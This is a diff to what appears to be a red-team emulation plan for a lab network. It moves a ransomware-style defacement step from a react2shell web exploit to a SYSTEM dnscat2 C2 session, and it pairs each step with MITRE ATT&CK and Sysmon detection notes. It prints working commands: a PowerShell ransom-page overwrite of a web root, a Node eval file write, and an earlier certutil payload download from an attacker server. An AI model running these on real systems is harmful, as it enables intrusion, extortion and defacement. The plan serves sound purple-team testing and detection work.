@@ -21,63 +21,17 @@ child-process spawning.
 **Step 2** announces the intrusion through two independent defacement channels — the
 Windows domain logon banner on DC01 and the upload portal web root on IIS01 — using
 the `TESTLAB\Administrator` dnscat2 session on DC01 (Phase 3) and the
-`IIS APPPOOL\react.testlab.local` react2shell HTTP shell on IIS01 (Phase 1).
+`NT AUTHORITY\SYSTEM` dnscat2 session on IIS01 (Phase 1). The upload portal web root
+(`C:\inetpub\upload.testlab.local\`) is owned by `IIS APPPOOL\upload.testlab.local`;
+only a SYSTEM-level session can write to it from outside that AppPool.
 
-No new lateral movement is required. `CertMaint.exe` must be transferred to IIS01 before
-Step 1 executes; the operator hosts it on the attacker machine's HTTP server and
-downloads it via `certutil` from the SYSTEM dnscat2 session.
 
 | Step | Host | Session | Techniques |
 | - | - | - | - |
-| Step 0 | — | — | Session verification |
 | Step 1 | IIS01 | NT AUTHORITY\SYSTEM dnscat2 (IIS01) | T1490, T1489, T1486 |
-| Step 2 | DC01 + IIS01 | TESTLAB\Administrator dnscat2 (DC01) + react2shell (IIS01) | T1491.001, T1112 |
+| Step 2 | DC01 + IIS01 | TESTLAB\Administrator dnscat2 (DC01) + NT AUTHORITY\SYSTEM dnscat2 (IIS01) | T1491.001, T1112 |
 
 ---
-
-## Step 0 — Setup
-
-### Procedures
-
-- Verify the IIS01 SYSTEM dnscat2 C2 session is active
-
-  ```text
-  dnscat2> windows
-  ```
-
-  - ***Expected Output***
-
-    ```text
-    ... Session N: IIS01 (NT AUTHORITY\SYSTEM) ...
-    ```
-
-- Verify the DC01 Administrator dnscat2 session is active
-
-  ```text
-  dnscat2> windows
-  ```
-
-  - ***Expected Output***
-
-    ```text
-    ... Session M: DC01 (TESTLAB\Administrator) ...
-    ```
-
-- Verify the react2shell HTTP session is reachable
-
-  ```bash
-  cd resources/payloads/react2shell-tool
-  python -m exploit_tool.main -t http://react.testlab.local
-  ```
-
-  - ***Expected Output***
-
-    ```text
-    rce >
-    ```
-
----
-
 ## Step 1 — Recovery Inhibition, Service Stop, and Data Encryption (IIS01)
 
 ### Voice Track
@@ -251,11 +205,15 @@ controller's registry values. Ransom note text files are also dropped at
 `C:\Users\Administrator\Desktop` and the `C:\` root so that the message is visible from
 any Explorer or shell session on DC01.
 
-On IIS01, the attacker uses the existing react2shell Node.js eval channel to write a
-ransom note HTML page directly to the `upload.testlab.local` web root. The AppPool
-identity (`IIS APPPOOL\react.testlab.local`) has write access to its own web root, so
-no privilege escalation is needed. From this point, any browser navigating to
-`http://upload.testlab.local` receives the ransom page instead of the upload portal.
+On IIS01, the attacker writes a ransom note HTML page directly to the
+`upload.testlab.local` web root using the SYSTEM dnscat2 session established in Phase 1.
+The `upload.testlab.local` web root (`C:\inetpub\upload.testlab.local\`) is owned by
+`IIS APPPOOL\upload.testlab.local`; the react2shell AppPool identity
+(`IIS APPPOOL\react.testlab.local`) does not hold write access to it. The SYSTEM session
+caries no such restriction: `powershell.exe` running at SYSTEM integrity writes
+`index.html` directly into `C:\inetpub\upload.testlab.local\`. From this point, any
+browser navigating to `http://upload.testlab.local` receives the ransom page instead of
+the upload portal.
 
 ### Procedures
 
@@ -300,16 +258,16 @@ no privilege escalation is needed. From this point, any browser navigating to
     (no output — files written silently)
     ```
 
-- ☣️ From the react2shell session on IIS01, write a ransom note HTML page to the upload portal web root
+- ☣️ From the IIS01 SYSTEM dnscat2 shell, write the ransom note HTML page to the upload portal web root
 
   ```text
-  rce > eval "require('fs').writeFileSync('C:\\\\inetpub\\\\upload.testlab.local\\\\index.html', '<html><head><title>ENCRYPTED</title></head><body style=\"background:#000;color:#f00;font-family:monospace;padding:40px\"><h1>!!! YOUR NETWORK HAS BEEN COMPROMISED !!!</h1><p>All files on this network have been encrypted and exfiltrated.</p><p>Contact us at <b>ransomgroup.onion</b> within 72 hours to negotiate decryption.</p></body></html>')"
+  C:\ProgramData> powershell -NoProfile -Command "Set-Content 'C:\inetpub\upload.testlab.local\index.html' '<html><head><title>ENCRYPTED</title></head><body style=""background:#000;color:#f00;font-family:monospace;padding:40px""><h1>!!! YOUR NETWORK HAS BEEN COMPROMISED !!!</h1><p>All files on this network have been encrypted and exfiltrated.</p><p>Contact us at <b>ransomgroup.onion</b> within 72 hours to negotiate decryption.</p></body></html>' -Encoding UTF8"
   ```
 
   - ***Expected Output***
 
     ```text
-    (no output — file written via eval; react2shell returns empty result on successful fs.writeFileSync)
+    (no output — file written silently)
     ```
 
 - Verify the web defacement from the attacker machine
@@ -331,7 +289,7 @@ no privilege escalation is needed. From this point, any browser navigating to
 | Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 13 on DC01: `powershell.exe` (child of `RuntimeBroker.exe` ghost) writes `LegalNoticeCaption` and `LegalNoticeText` string values under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`; registry key path matches Windows logon-screen policy | Calibrated - Not Benign | `Set-ItemProperty` modifies `LegalNoticeCaption` and `LegalNoticeText` on DC01 to display a ransom message at domain logon — affects all domain-joined machines drawing policy from this DC | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
 | Defense Evasion | T1112 | Modify Registry | Windows | Sysmon Event 13 on DC01: `powershell.exe` sets `LegalNoticeCaption` (REG_SZ) and `LegalNoticeText` (REG_SZ) under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` via `Set-ItemProperty`; parent process is `RuntimeBroker.exe` ghost | Not Calibrated - Not Benign | Registry modification implementing the logon-banner defacement; same physical event as T1491.001 above but independently scored as a registry-modification behavior | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
 | Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 11 on DC01: `powershell.exe` (child of `RuntimeBroker.exe` ghost) creates `README_DECRYPT.txt` at `C:\` and `C:\Users\Administrator\Desktop\` | Calibrated - Not Benign | `Set-Content` drops ransom note text files at two paths on DC01; file name `README_DECRYPT.txt` matches ransomware ransom-note naming convention | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
-| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 11 on IIS01: `node.exe` (IIS APPPOOL\react.testlab.local) creates `index.html` in `C:\inetpub\upload.testlab.local\` via `fs.writeFileSync` called through react2shell eval channel; HTTP access to `upload.testlab.local/` now returns ransom page | Calibrated - Not Benign | react2shell eval executes `fs.writeFileSync` to overwrite the upload portal landing page with a ransom HTML page on IIS01; no child process spawned — write occurs entirely within `node.exe` | IIS01 (10.12.10.20) | IIS APPPOOL\react.testlab.local | [file_ops.py eval path](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
+| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 11 on IIS01: `powershell.exe` (child of `cmd.exe`, grandchild of `RuntimeBroker.exe` ghost) creates `index.html` in `C:\inetpub\upload.testlab.local\`; writing process identity is NT AUTHORITY\SYSTEM — anomalous for a web root file write where the expected writer is an IIS AppPool; HTTP access to `upload.testlab.local/` now returns ransom page | Calibrated - Not Benign | `Set-Content` from the SYSTEM dnscat2 shell overwrites the upload portal landing page (`C:\inetpub\upload.testlab.local\index.html`) with a ransom HTML page; `IIS APPPOOL\react.testlab.local` lacks write access to this directory — SYSTEM identity is required | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
 
 ---
 
